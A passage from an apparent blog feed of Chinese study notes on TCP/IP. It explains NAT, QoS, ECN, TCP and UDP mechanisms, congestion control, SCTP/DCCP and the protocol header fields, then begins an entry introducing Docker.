title="image-20230808003910363"><p>在使用TCP&#x2F;UDP的通信当中，只有目标地址、源地址、目标端口、源端口以及协议类型（TCP还是UDP）五项内容都一致时才被认为是同一个通信连接。此时所使用的正是NAPT。</p><p>如图5.20所示，生成一个NAPT路由器的转换表，就可以正确地转换地址跟端口的组合。这种转换表在NAT路由器上自动生成。例如，在TCP的情况下，建立TCP连接首次握手时的SYN包一经发出，就会生成这个表。而后又随着收到关闭连接时发出FIN包的确认应答从表中被删除。</p><h3 id="5-6-3-NAT-PT-NAPT-PT"><a href="#5-6-3-NAT-PT-NAPT-PT" class="headerlink" title="5.6.3 NAT-PT(NAPT-PT)"></a>5.6.3 NAT-PT(NAPT-PT)</h3><p>NAT-PT是将IPv6的首部转换为IPv4的首部的一种技术。</p><img src="/2023/08/06/TCP-IP/image-20230808003948986.png" class title="image-20230808003948986"><h2 id="5-8-其他IP相关技术"><a href="#5-8-其他IP相关技术" class="headerlink" title="5.8 其他IP相关技术"></a>5.8 其他IP相关技术</h2><h3 id="5-8-2-IP任播"><a href="#5-8-2-IP任播" class="headerlink" title="5.8.2 IP任播"></a>5.8.2 IP任播</h3><p>IP任播是指为那些提供同一种服务的服务器配置同一个IP地址，并与最近的服务器进行通信的一种方法。主要用于110报警和119。</p><h3 id="5-8-3-通信质量控制"><a href="#5-8-3-通信质量控制" class="headerlink" title="5.8.3 通信质量控制"></a>5.8.3 通信质量控制</h3><p><strong>通信质量的定义</strong><br>通信线路上的拥塞叫做收敛。当网络发生故障时，路由器和集线器（交换集线器）的队列溢出，会出现大量的丢包现象，从而极端影响通信性能。</p><p>控制通信质量的机制</p><p><strong>1. IntServ</strong><br>IntServ是针对特定应用之间的通信进行质量控制的一种机制。这里的“特定的应用”是指源IP地址、目标IP地址、源端口、目标端口、以及协议号五项内容完全一致。</p><p>IntServ所涉及的通信并非一直进行，只是在必要的时候进行。一次IntServ也只有在必要的时候才要求在路由器上进行设置，这也叫“流量设置”，实现这种流量控制的协议正是RSVP。</p><p>RSVP中在接收端针对发送端传送控制包，并在它们之间所有的路由器上进行有质量控制的设定。</p><p><strong>2.DiffServ</strong></p><p>IntServ针对应用的连接进行详细的通信质量控制。相比之下，DiffServ则针对特定的网络进行较粗粒度的通信质量控制。</p><p>进行DiffServ质量控制的网络叫做DiffServ域。在该域中的路由器会对所有进入该域IP包首部的DSCP字段进行替换。对于期望被优化处理的包设置一个优先值。</p><img src="/2023/08/06/TCP-IP/image-20230808004123698.png" class title="image-20230808004123698"><h3 id="5-8-4-显示拥塞通知"><a href="#5-8-4-显示拥塞通知" class="headerlink" title="5.8.4 显示拥塞通知"></a>5.8.4 显示拥塞通知</h3><p>当发生网络拥塞时，发生主机应该减少数据包的发送量。作为IP上层协议，TCP虽然也能控制网络拥塞，不过它是通过数据包的实际损坏情况来判断是否发生拥塞。然而这种方法并不能在数据包损坏之前减少数据包的发送量。</p><p>为了解决这个问题，人们在IP层新增了一个使用显示拥塞通知的机制，即ECN。</p><p>ECN的机制概况起来就是在发送包的IP首部中记录路由器是否遇到拥塞，并在返回包的TCP首部中通知是否发生拥塞。拥塞检查在网络层进行，而拥塞通知则在传输层进行，这两层的互相协助实现了拥塞通知的功能。</p><img src="/2023/08/06/TCP-IP/image-20230808004144763.png" class title="image-20230808004144763"><h1 id="第6章-TCP与UDP"><a href="#第6章-TCP与UDP" class="headerlink" title="第6章 TCP与UDP"></a>第6章 TCP与UDP</h1><p>本章旨在介绍传输层的两个主要协议TCP（Transmission ControlProtocol）与UDP（User Datagram Protocol）。</p><h2 id="6-1-传输层的作用"><a href="#6-1-传输层的作用" class="headerlink" title="6.1 传输层的作用"></a>6.1 传输层的作用</h2><h3 id="6-1-3-两种传输层协议-TCP和UDP"><a href="#6-1-3-两种传输层协议-TCP和UDP" class="headerlink" title="6.1.3 两种传输层协议 TCP和UDP"></a>6.1.3 两种传输层协议 TCP和UDP</h3><p>TCP</p><p>TCP是面向连接的、可靠的流协议。流就是指不间断的数据结构。当应用程序采用TCP发送消息时，虽然可以保证发送的顺序，但还是犹如没有任何间隔的数据流发送给接收端。</p><p>TCP为提供可靠性传输、实行“顺序控制”或“重发控制”机制。此外还具有“流控制（流量控制）”、“拥塞控制”、提高网络利用率等众多功能。</p><img src="/2023/08/06/TCP-IP/image-20230808004305558.png" class title="image-20230808004305558"><p><strong>UDP</strong></p><p>UDP是不具备可靠性的数据报协议。在UDP的情况下，虽然可以确保发送消息的大小，却不能保证消息一定会到达。<img src="/2023/08/06/TCP-IP/image-20230808004326486.png" class title="image-20230808004326486"></p><h3 id="6-1-4-TCP与UDP区分"><a href="#6-1-4-TCP与UDP区分" class="headerlink" title="6.1.4 TCP与UDP区分"></a>6.1.4 TCP与UDP区分</h3><p>UDP主要用于对高速传输和实时性有较高要求的通信或广播通信。以IP电话通信为例，如果使用TCP，数据在传送过程中如果丢失被重发，这样无法流畅地传输通话人的声音，会导致无法正常交流。而采用UDP，它不会进行重发处理。即使有部分数据丢失，也只是影响一小部分的通话。此外，在多播和广播通信中也使用UDP。RIP、DHCP等基于广播的协议也要依赖于UDP。</p><p>Socket套接字</p><img src="/2023/08/06/TCP-IP/image-20230808004401064.png" class title="image-20230808004401064"><h2 id="6-2-端口号"><a href="#6-2-端口号" class="headerlink" title="6.2 端口号"></a>6.2 端口号</h2><p>TCP：<img src="/2023/08/06/TCP-IP/image-20230808004427406.png" class title="image-20230808004427406"></p><img src="/2023/08/06/TCP-IP/image-20230808004435351.png" class title="image-20230808004435351"><p>UDP：<img src="/2023/08/06/TCP-IP/image-20230808004455854.png" class title="image-20230808004455854"></p><img src="/2023/08/06/TCP-IP/image-20230808004503827.png" class title="image-20230808004503827"><h2 id="6-3-UDP"><a href="#6-3-UDP" class="headerlink" title="6.3 UDP"></a>6.3 UDP</h2><p>UDP是User Datagram Protocol的缩写。</p><p>UDP不提供复杂的控制协议，利用IP提供面向无连接的通信服务。</p><p>即使是出现网络拥塞的情况下，UDP也无法进行流量控制等避免网络拥塞的行为。传输途中如果出现丢包，UDP也不负责重发。当出现包顺序乱掉的时候也没有纠正的功能。</p><p>由于UDP面向无连接，它可以随时发送数据。再加上UDP本身的处理既简单又高效，因此经常用于以下几个方面：</p><p>包总量较少的通信（DNS、SNMP等）<br>视频、音频等多媒体通信（即时通信）<br>现定于LAN等特定网络中的应用通信<br>广播通信（广播、多播）</p><h2 id="6-4-TCP"><a href="#6-4-TCP" class="headerlink" title="6.4 TCP"></a>6.4 TCP</h2><p>TCP与UDP的区别相当大。它充分地实现了数据传输时各种控制功能，可以进行丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。TCP作为一种面向连接的协议，只有在确认通信对端存在时才会发送数据，从而可以控制通信流量的浪费。</p><h3 id="6-4-1-TCP的特点及其目的"><a href="#6-4-1-TCP的特点及其目的" class="headerlink" title="6.4.1 TCP的特点及其目的"></a>6.4.1 TCP的特点及其目的</h3><p>TCP通过检验和、序列化、确认应答、重发控制、连接管理以及窗口控制等机制实现可靠性传输。</p><h3 id="6-4-2-通过序列号与确认应答提高可靠性"><a href="#6-4-2-通过序列号与确认应答提高可靠性" class="headerlink" title="6.4.2 通过序列号与确认应答提高可靠性"></a>6.4.2 通过序列号与确认应答提高可靠性</h3><p>在TCP中，当发送端的数据到达接收主机时，接收端主机会返回一个亿收到消息的通知。这个消息叫做确认应答（ACK）。</p><p>如图6.8与6.9所示</p><img src="/2023/08/06/TCP-IP/image-20230808004544709.png" class title="image-20230808004544709"><img src="/2023/08/06/TCP-IP/image-20230808004554701.png" class title="image-20230808004554701"><p>这些确认应答处理、重发控制以及重复控制等功能都可以通过序列号实现。序列号是按顺序给发送数据的每一个字节（8位字节）都标上号码的编号。接收端查询接收数据TCP首部中的序列号和数据的长度，将自己下一步应该接收的序号作为确认应答返送回去。就这样，通过序列号和确认应答号，TCP可以实现可靠传输。</p><img src="/2023/08/06/TCP-IP/image-20230808004615529.png" class title="image-20230808004615529"><h3 id="6-4-4-连接管理"><a href="#6-4-4-连接管理" class="headerlink" title="6.4.4 连接管理"></a>6.4.4 连接管理</h3><p>TCP在数据通信之前，通过TCP首部发送一个SYN包作为建立连接的请求等待确认应答。如果对端发来确认应答，则认为可以进行数据通信。此外，在通信结束时会进行断开连接的处理（FIN包）。</p><p>可以使用TCP首部用于控制的字段来管理TCP连接。一个连接的建立与断开，正常过程至少需要来回发送7个包才能完成。</p><p><strong>三次握手四次挥手：</strong></p><img src="/2023/08/06/TCP-IP/image-20230808004643184.png" class title="image-20230808004643184"><h3 id="6-4-5-TCP是以段为单位发送数据"><a href="#6-4-5-TCP是以段为单位发送数据" class="headerlink" title="6.4.5 TCP是以段为单位发送数据"></a>6.4.5 TCP是以段为单位发送数据</h3><p>在建立TCP连接时，也可以确定发送数据包的单位，称为“最大消息长度”（MSS:Maximun Segment Size）。最理想的情况是：最大消息长度正好是IP中不会被分片处理的最大数据长度。</p><p>TCP在传送大量数据时，是以MSS的大小将数据进行分割发送。进行重发时也是以MSS为单位。</p><p>MSS是在三次握手的时候，在两端主机之间被计算得出。两端的主机在发出建立连接的请求时，会在TCP首部中写入MSS选项，告诉对方自己的接口能够适应的MSS的大小，然后在两者之间选择一个较小的值。</p><img src="/2023/08/06/TCP-IP/image-20230808004703600.png" class title="image-20230808004703600"><h3 id="6-4-6-利用窗口控制提高速度"><a href="#6-4-6-利用窗口控制提高速度" class="headerlink" title="6.4.6 利用窗口控制提高速度"></a>6.4.6 利用窗口控制提高速度</h3><p>窗口大小就是指无需等待确认应答而可以继续发送数据的最大值。图6.15中，窗口大小为4个段。</p><img src="/2023/08/06/TCP-IP/image-20230808004747608.png" class title="image-20230808004747608"><p><strong>滑动窗口方式：</strong></p><img src="/2023/08/06/TCP-IP/image-20230808004829540.png" class title="image-20230808004829540"><h3 id="6-4-7-窗口控制和重发控制"><a href="#6-4-7-窗口控制和重发控制" class="headerlink" title="6.4.7 窗口控制和重发控制"></a>6.4.7 窗口控制和重发控制</h3><p>在使用窗口控制中，如果出现段丢失该怎么办？</p><p>首先，我们先考虑确认应答未能返回的情况。在这种情况下，数据已经到达对端，是不需要再进行重发的。然而，在没有使用窗口控制的时候，没有收到确认应答的数据都会被重发。而使用了窗口控制，就如图6.17所示，某些确认应答即便丢失也无需重发。</p><img src="/2023/08/06/TCP-IP/image-20230808004854219.png" class title="image-20230808004854219"><p>其次，我们来考虑一下某个报文段丢失的情况。如图6.18所示，接收主机如果收到一个自己应该接收的序号以外的数据时，会针对当前为止收到数据返回确认应答（不过即使接收端主机收到的包序号并不连续，也不会将数据丢弃而是暂时保存至缓冲区中）。<br>如图6.18所示。当某一报文段丢失后，发送端会一直收到序号为1001的确认应答，这个确认应答好像在提醒发送端“我想接收的是从1001开始的数据”。因此，在窗口比较大，又出现报文段丢失的情况下，同一个序号的确认应答将会被重复不断地返回。而发送端主机如果连续3次收到同一个确认应答 ，就会将其所对应的数据进行重发。这种机制比之前提到的超时管理更加高效，因此也被称作高速重发控制。</p><img src="/2023/08/06/TCP-IP/image-20230808004952068.png" class title="image-20230808004952068"><h3 id="6-4-8-流控制"><a href="#6-4-8-流控制" class="headerlink" title="6.4.8 流控制"></a>6.4.8 流控制</h3><p>发送端根据自己的实际情况发送数据。但是，接收端可能收到的是一个毫无关系的数据包又可能会在处理其他问题上花费一些时间。为了防止这种现象的发生，TCP提供一种机制可以让发送端根据接收端的实际接收能力控制发送的数据量。这就是所谓的流控制。它的具体操作是，接收端主机向发送端主机通知自己可以接收数据的大小，于是发送端会发送不超过这个限度的数据。该大小限度就被称作窗口大小。</p><p>TCP首部中，专门有一个字段用来通知窗口大小。接收主机将自己可以接收的缓冲区大小放入这个字段中通知给发送端。这个字段的值越大，说明网络的吞吐量越高。</p><p>不过，接收端的这个缓冲区一旦面临数据溢出时，窗口大小的值也会随之被设置为一个更小的值通知给发送端，从而控制数据发送量。也就是说，发送端主机会根据接收端主机的指示，对发送数据的量进行控制。这也就形成了一个完整的TCP流控制（流量控制）。</p><p>图6.19为根据窗口大小控制流量过程的示例。</p><img src="/2023/08/06/TCP-IP/image-20230808005044243.png" class title="image-20230808005044243">如图6.19所示，当接收端收到从3001号开始的数据段后其缓冲区即满，不得不暂时停止接收数据。之后，在收到发送窗口更新通知后通信才得以继续进行。如果这个窗口的更新通知在传送途中丢失，可能会导致无法继续通信。为避免此类问题的发生，发送端主机会时不时的发送一个叫做窗口探测的数据段，此数据段仅含一个字节以获取最新的窗口大小信息。<h3 id="6-4-9-拥塞控制"><a href="#6-4-9-拥塞控制" class="headerlink" title="6.4.9 拥塞控制"></a>6.4.9 拥塞控制</h3><p>一般来说，计算机网络都处在一个共享的环境。因此也有可能会因为其他主机之间的通信使得网络拥堵。在网络出现拥堵时，如果突然发送一个较大量的数据，极有可能会导致整个网络的瘫痪。</p><p>TCP为了防止该问题的出现，在通信一开始时就会通过一个叫做慢启动的算法得出的数值，对发送数据量进行控制。<img src="/2023/08/06/TCP-IP/image-20230808005058815.png" class title="image-20230808005058815"></p><p>首先，为了在发送端调节所要发送数据的量，定义了一个叫做“拥塞窗口”的概念。于是在慢启动的时候，将这个拥塞窗口的大小设置为1个数据段（1MSS） 发送数据，之后每收到一次确认应答（ACK），拥塞窗口的值就加1。在发送数据包时，将拥塞窗口的大小与接收端主机通知的窗口大小做比较，然后按照它们当中较小那个值，发送比其还要小的数据量。</p><p>如果重发采用超时机制，那么拥塞窗口的初始值可以设置为1以后再进行慢启动修正。有了上述这些机制，就可以有效地减少通信开始时连续发包导致的网络拥堵，还可以避免网络拥塞情况的发生。</p><p>不过，随着包的每次往返，拥塞窗口也会以1、2、4等指数函数的增长，拥堵状况激增甚至导致网络拥塞的发生。为了防止这些，引入了慢启动阀值的概念。只要拥塞窗口的值超出这个阀值，在每收到一次确认应答时，只允许以下面这种比例放大拥塞窗口：</p><img src="/2023/08/06/TCP-IP/image-20230808005128459.png" class title="image-20230808005118574"><p>拥塞窗口越大，确认应答的数目也会增加。不过随着每收到一个确认应答，其涨幅也会逐渐减少，甚至小过比一个数据段还要小的字节数。因此，拥塞窗口的大小会呈直线上升的趋势。</p><p>TCP的通信开始时，并没有设置相应的慢启动阀值 。而是在超时重发时，才会设置为当时拥塞窗口一半的大小。</p><p>由重复确认应答而触发的高速重发与超时重发机制的处理多少有些不同。因为前者要求至少3次的确认应答数据段到达对方主机后才会触发，相比后者网络的拥堵要轻一些。</p><p>而由重复确认应答进行高速重发控制时，慢启动阀值的大小被设置为当时窗口大小的一半（严格来说，是设置为“实际已发送但未收到确认应答的数据量”的一半）。然后将窗口的大小设置为该慢启动阀值+3个数据段的大小。</p><p>有了这样一种控制，TCP的拥塞窗口如图6.21所示发生变化。由于窗口的大小会直接影响数据被转发时的吞吐量，所以一般情况下，窗口越大，越会形成高吞吐量的通信。</p><h2 id="6-5-其他传输层协议"><a href="#6-5-其他传输层协议" class="headerlink" title="6.5 其他传输层协议"></a>6.5 其他传输层协议</h2><h3 id="6-5-1-UDP-Lite"><a href="#6-5-1-UDP-Lite" class="headerlink" title="6.5.1 UDP-Lite"></a>6.5.1 UDP-Lite</h3><p>UDP-Lite（Lightweight User Datagram Protocol，轻量级用户数据报协议）是扩展UDP机能的一种传输层协议。在基于UDP的通信当中如果校验和出现错误，所收到的包将被全部丢弃。然而，现实操作中，有些应用（例如那些使用H.263+，H.264，MPEG-4等图像与音频数据格式的应用。） 在面对这种情况时并不希望把已经收到的所有包丢弃。</p><p>UDP-Lite提供与UDP几乎相同的功能，不过计算校验和的范围可以由应用自行决定。这个范围可以是包加上伪首部的校验和计算，可以是首部与伪首部的校验和计算，也可以是首部、伪首部与数据从起始到中间某个位置的校验和计算 。有了这样的机制，就可以只针对不允许发生错误的部分进行校验和的检查。对于其他部分，即使发生了错误，也会被忽略不计。而这个包也不会被丢弃，而是直接传给应用继续处理。</p><h3 id="6-5-2-SCTP"><a href="#6-5-2-SCTP" class="headerlink" title="6.5.2 SCTP"></a>6.5.2 SCTP</h3><p>SCTP（Stream Control Transmission Protocol，流控制传输协议）与TCP一样，都是对一种提供数据到达与否相关可靠性检查的传输层协议。其主要特点如下：</p><h5 id="以消息为单位收发"><a href="#以消息为单位收发" class="headerlink" title="以消息为单位收发"></a>以消息为单位收发</h5><p>TCP中接收端并不知道发送端应用所决定的消息大小。在SCTP中却可以。</p><h5 id="支持多重宿主"><a href="#支持多重宿主" class="headerlink" title="支持多重宿主"></a>支持多重宿主</h5><p>在有多个NIC的主机中，即使其中能够使用的NIC发生变化，也仍然可以继续通信（这与TCP相比提高了故障应对能力） 。</p><h5 id="支持多数据流通信"><a href="#支持多数据流通信" class="headerlink" title="支持多数据流通信"></a>支持多数据流通信</h5><p>TCP中建立多个连接以后才能进行通信的效果，在SCTP中一个连接就可以。（吞吐量得到有效提升。）</p><h5 id="可以定义消息的生存期限"><a href="#可以定义消息的生存期限" class="headerlink" title="可以定义消息的生存期限"></a>可以定义消息的生存期限</h5><p>超过生存期限的消息，不会被重发。</p><p>SCTP主要用于进行通信的应用之间发送众多较小消息的情况。这些较小的应用消息被称作数据块（Chunk），多个数据块组成一个数据包。</p><p>此外，SCTP具有支持多重宿主以及设定多个IP地址的特点。多重宿主是指同一台主机具备多种网络的接口。例如，笔记本电脑既可以连接以太网又可以连接无线LAN。同时使用以太网和无线LAN时，各自的NIC会获取到不同的IP地址。进行TCP通信，如果开始时使用的是以太网，而后又切换为无线LAN，那么连接将会被断开。因为从SYN到FIN包必须使用同一个IP地址。</p><p>然而在SCTP的情况下，由于可以管理多个IP地址使其同时进行通信，因此即使出现通信过程当中以太网与无线LAN之间的切换，也能够保持通信不中断。所以SCTP可以为具备多个NIC的主机提供更可靠的传输（持有多个NIC的应用服务器中，即使某一个NIC发生故障，只要有一个能够正常工作的NIC就可以保持通信无阻） 。</p><h3 id="6-5-3-DCCP"><a href="#6-5-3-DCCP" class="headerlink" title="6.5.3 DCCP"></a>6.5.3 DCCP</h3><p>DCCP（Datagram Congestion Control Protocol，数据报拥塞控制协议）是一个辅助UDP的崭新的传输层协议。UDP没有拥塞控制机制。为此，当应用使用UDP发送大量数据包时极容易出现问题。于是便出现了DCCP这样的规范。</p><p>DCCP具有如下几个特点：</p><p>与UDP一样，不能提供发送数据的可靠性传输。<br>它面向连接，具备建立连接与断开连接的处理。在建立和断开连接上是具有可靠性。<br>能够根据网络拥堵情况进行拥塞控制。使用DCCP（RFC4340）应用可以根据自身特点选择两种方法进行拥塞控制。它们分别是“类似TCP（TCP-Like）拥塞控制”和“TCP友好升级控制”（TCP-Friendly Rate Control）。<br>为了进行拥塞控制，接收端收到包以后返回确认应答（ACK）。该确认应答将被用于重发与否的判断。</p><h2 id="6-6-UDP首部的格式"><a href="#6-6-UDP首部的格式" class="headerlink" title="6.6 UDP首部的格式"></a>6.6 UDP首部的格式</h2><p>图6.24展示了UDP首部的格式。除去数据的部分正是UDP的首部。UDP首部由源端口号，目标端口号，包长和校验和组成。</p><img src="/2023/08/06/TCP-IP/image-20230808005243392.png" class title="image-20230808005243392"><h5 id="源端口号（Source-Port）"><a href="#源端口号（Source-Port）" class="headerlink" title="源端口号（Source Port）"></a>源端口号（Source Port）</h5><p>表示发送端端口号，字段长16位。该字段是可选项，有时可能不会设置源端口号。没有源端口号的时候该字段的值设置为0。可用于不需要返回的通信中。</p><h5 id="目标端口号（Destination-Port）"><a href="#目标端口号（Destination-Port）" class="headerlink" title="目标端口号（Destination Port）"></a>目标端口号（Destination Port）</h5><p>表示接收端端口，字段长度16位。</p><h5 id="包长度（Length）"><a href="#包长度（Length）" class="headerlink" title="包长度（Length）"></a>包长度（Length）</h5><p>该字段保存了UDP首部的长度跟数据的长度之和 。单位为字节（8位字节）。</p><h5 id="校验和（Checksum）"><a href="#校验和（Checksum）" class="headerlink" title="校验和（Checksum）"></a>校验和（Checksum）</h5><p>校验和是为了提供可靠的UDP首部和数据而设计。</p><h2 id="6-7-TCP首部格式"><a href="#6-7-TCP首部格式" class="headerlink" title="6.7 TCP首部格式"></a>6.7 TCP首部格式</h2><p>图6.26展示了TCP首部的格式。TCP首部相比UDP首部要复杂得多。另外，TCP中没有表示包长度和数据长度的字段。可由IP层获知TCP的包长由TCP的包长可知数据的长度。</p><img src="/2023/08/06/TCP-IP/image-20230808005320190.png" class title="image-20230808005320190"><h5 id="源端口号（Source-Port）-1"><a href="#源端口号（Source-Port）-1" class="headerlink" title="源端口号（Source Port）"></a>源端口号（Source Port）</h5><p>表示发送端端口号，字段长16位。</p><h5 id="目标端口号（Destination-Port）-1"><a href="#目标端口号（Destination-Port）-1" class="headerlink" title="目标端口号（Destination Port）"></a>目标端口号（Destination Port）</h5><p>表示接收端端口号，字段长度16位。</p><h5 id="序列号（Sequence-Number）"><a href="#序列号（Sequence-Number）" class="headerlink" title="序列号（Sequence Number）"></a>序列号（Sequence Number）</h5><p>字段长32位。序列号（有时也叫序号）是指发送数据的位置。每发送一次数据，就累加一次该数据字节数的大小。</p><p>序列号不会从0或1开始，而是在建立连接时由计算机生成的随机数作为其初始值，通过SYN包传给接收端主机。然后再将每转发过去的字节数累加到初始值上表示数据的位置。此外，在建立连接和断开连接时发送的SYN包和FIN包虽然并不携带数据，但是也会作为一个字节增加对应的序列号。</p><h5 id="确认应答号（Acknowledgement-Number）"><a href="#确认应答号（Acknowledgement-Number）" class="headerlink" title="确认应答号（Acknowledgement Number）"></a>确认应答号（Acknowledgement Number）</h5><p>确认应答号字段长度32位。是指下一次应该收到的数据的序列号。实际上，它是指已收到确认应答号减一为止的数据。发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。</p><h5 id="数据偏移（Data-Offset）"><a href="#数据偏移（Data-Offset）" class="headerlink" title="数据偏移（Data Offset）"></a>数据偏移（Data Offset）</h5><p>该字段表示TCP所传输的数据部分应该从TCP包的哪个位开始计算，当然也可以把它看作TCP首部的长度。该字段长4位，单位为4字节（即32位）。不包括选项字段的话，如图6.26所示TCP的首部为20字节长，因此数据偏移字段可以设置为5。反之，如果该字段的值为5，那说明从TCP包的最一开始到20字节为止都是TCP首部，余下的部分为TCP数据。</p><h5 id="保留（Reserved）"><a href="#保留（Reserved）" class="headerlink" title="保留（Reserved）"></a>保留（Reserved）</h5><p>该字段主要是为了以后扩展时使用，其长度为4位。一般设置为0，但即使收到的包在该字段不为0，此包也不会被丢弃 。</p><h5 id="控制位（Control-Flag）"><a href="#控制位（Control-Flag）" class="headerlink" title="控制位（Control Flag）"></a>控制位（Control Flag）</h5><p>字段长为8位，每一位从左至右分别为CWR、ECE、URG、ACK、PSH、RST、SYN、FIN。这些控制标志也叫做控制位。当它们对应位上的值为1时，具体含义如图6.27所示。</p><img src="/2023/08/06/TCP-IP/image-20230808005408145.png" class title="image-20230808005408145"><h5 id="WR（Congestion-Window-Reduced）"><a href="#WR（Congestion-Window-Reduced）" class="headerlink" title="WR（Congestion Window Reduced）"></a>WR（Congestion Window Reduced）</h5><p>CWR标志 与后面的ECE标志都用于IP首部的ECN字段。ECE标志为1时，则通知对方已将拥塞窗口缩小。</p><h5 id="ECE（ECN-Echo）"><a href="#ECE（ECN-Echo）" class="headerlink" title="ECE（ECN-Echo）"></a>ECE（ECN-Echo）</h5><p>ECE标志 表示ECN-Echo。置为1会通知通信对方，从对方到这边的网络有拥塞。在收到数据包的IP首部中ECN为1时将TCP首部中的ECE设置为1。</p><h5 id="URG（Urgent-Flag）"><a href="#URG（Urgent-Flag）" class="headerlink" title="URG（Urgent Flag）"></a>URG（Urgent Flag）</h5><p>该位为1时，表示包中有需要紧急处理的数据。</p><h5 id="ACK（Acknowledgement-Flag）"><a href="#ACK（Acknowledgement-Flag）" class="headerlink" title="ACK（Acknowledgement Flag）"></a>ACK（Acknowledgement Flag）</h5><p>该位为1时，确认应答的字段变为有效。TCP规定除了最初建立连接时的SYN包之外该位必须设置为1。</p><h5 id="PSH（Push-Flag）"><a href="#PSH（Push-Flag）" class="headerlink" title="PSH（Push Flag）"></a>PSH（Push Flag）</h5><p>该位为1时，表示需要将受到的数据立刻传给上层应用协议。PSH为0时，则不需要立即传而是先进行缓存。</p><h5 id="RST（Reset-Flag）"><a href="#RST（Reset-Flag）" class="headerlink" title="RST（Reset Flag）"></a>RST（Reset Flag）</h5><p>该位为1时表示TCP连接中出现异常必须强制断开连接。例如，一个没有被使用的端口即使发来连接请求，也无法进行通信。此时就可以返回一个RST设置为1的包。</p><h5 id="SYN（Synchronize-Flag）"><a href="#SYN（Synchronize-Flag）" class="headerlink" title="SYN（Synchronize Flag）"></a>SYN（Synchronize Flag）</h5><p>用于建立连接。SYN为1表示希望建立连接，并在其序列号的字段进行序列号初始值的设定（Synchronize本身有同步的意思。也就意味着建立连接的双方，序列号和确认应答号要保持同步） 。</p><h5 id="FIN（Fin-Flag）"><a href="#FIN（Fin-Flag）" class="headerlink" title="FIN（Fin Flag）"></a>FIN（Fin Flag）</h5><p>该位为1时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换FIN位置为1的TCP段。每个主机又对对方的FIN包进行确认应答以后就可以断开连接。不过，主机收到FIN设置为1的TCP段以后不必马上回复一个FIN包，而是可以等到缓冲区中的所有数据都因已成功发送而被自动删除之后再发。</p><h5 id="窗口大小（Window-Size）"><a href="#窗口大小（Window-Size）" class="headerlink" title="窗口大小（Window Size）"></a>窗口大小（Window Size）</h5><p>该字段长为16位。用于通知从相同TCP首部的确认应答号所指位置开始能够接收的数据大小（8位字节）。TCP不允许发送超过此处所示大小的数据。不过，如果窗口为0，则表示可以发送窗口探测，以了解最新的窗口大小。但这个数据必须是1个字节。</p><h5 id="校验和（Checksum）-1"><a href="#校验和（Checksum）-1" class="headerlink" title="校验和（Checksum）"></a>校验和（Checksum）</h5><img src="/2023/08/06/TCP-IP/image-20230808005440704.png" class title="image-20230808005440704"><p>TCP和UDP一样在计算校验和的时候使用TCP伪首部。这个伪首部如图6.28所示。为了让其全长为16位的整数倍，需要在数据部分的最后填充0。首先将TCP校验和字段设置为0。然后以16位为单位进行1的补码和计算，再将它们总和的1的补码和放入校验和字段。</p><p>接收端在收到TCP数据段以后，从IP首部获取IP地址信息构造TCP伪首部，再进行校验和计算。由于校验和字段里保存着除本字段以外其他部分的和的补码值，因此如果计算校验和字段在内的所有数据的16位和以后，得出的结果是“16位全部为1 ”说明所收到的数据是正确的。</p><h5 id="使用校验和的目的是什么？"><a href="#使用校验和的目的是什么？" class="headerlink" title="使用校验和的目的是什么？"></a>使用校验和的目的是什么？</h5><p>TCP或UDP如果能够提供校验和计算，也可以判断协议首部和数据是否被破坏。</p><h5 id="紧急指针（Urgent-Pointer）"><a href="#紧急指针（Urgent-Pointer）" class="headerlink" title="紧急指针（Urgent Pointer）"></a>紧急指针（Urgent Pointer）</h5><p>该字段长为16位。只有在URG控制位为1时有效。该字段的数值表示本报文段中紧急数据的指针。正确来讲，从数据部分的首位到紧急指针所指示的位置为止为紧急数据。因此也可以说紧急指针指出了紧急数据的末尾在报文段中的位置。</p><h5 id="选项（Options）"><a href="#选项（Options）" class="headerlink" title="选项（Options）"></a>选项（Options）</h5><p>选项字段用于提高TCP的传输性能。因为根据数据偏移（首部长度）进行控制，所以其长度最大为40字节。</p><img src="/2023/08/06/TCP-IP/image-20230808005515241.png" class title="image-20230808005515241"><p><strong>窗口大小与吞吐量</strong></p><img src="/2023/08/06/TCP-IP/image-20230808005536195.png" class title="image-20230808005536195">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>尚硅谷Docker</title>
    <link href="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/"/>
    <url>/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker基础篇"><a href="#Docker基础篇" class="headerlink" title="Docker基础篇"></a>Docker基础篇</h1><h2 id="一、Docker简介"><a href="#一、Docker简介" class="headerlink" title="一、Docker简介"></a>一、<a href="https://so.csdn.net/so/search?q=Docker&spm=1001.2101.3001.7020">Docker</a>简介</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202132661.png" class title="image-20230808202132661"><p>Docker的出现是为了解决代码在本机可以正常运行，而部署到其他机器不能运行的问题。这是因为代码运行所需要的环境、系统、配置、数据等不同，Docker透过镜像将程序运行所需要的系统环境由下而上打包，达到应用程序跨平台间的无缝接轨运行。</p><p>Linux 容器技术的出现就解决了这样一个问题，而 Docker 就是在它的基础上发展过来的。将应用运行在 Docker 容器上面，而 Docker 容器在任何操作系统上都是一致的，这就实现了跨平台、跨服务器。只需要一次配置好环境，换到别的机子上就可以一键部署好，大大简化了操作。</p><h3 id="2-Docker与传统虚拟化方式的不同"><a href="#2-Docker与传统虚拟化方式的不同" class="headerlink" title="2. Docker与传统虚拟化方式的不同"></a>2. Docker与传统虚拟化方式的不同</h3><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202204237.png" class title="image-20230808202204237"><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202210191.png" class title="image-20230808202210191"><p>1.传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程</p><p>2.而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便</p><p>3.每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源</p><h3 id="3-Docker三要素"><a href="#3-Docker三要素" class="headerlink" 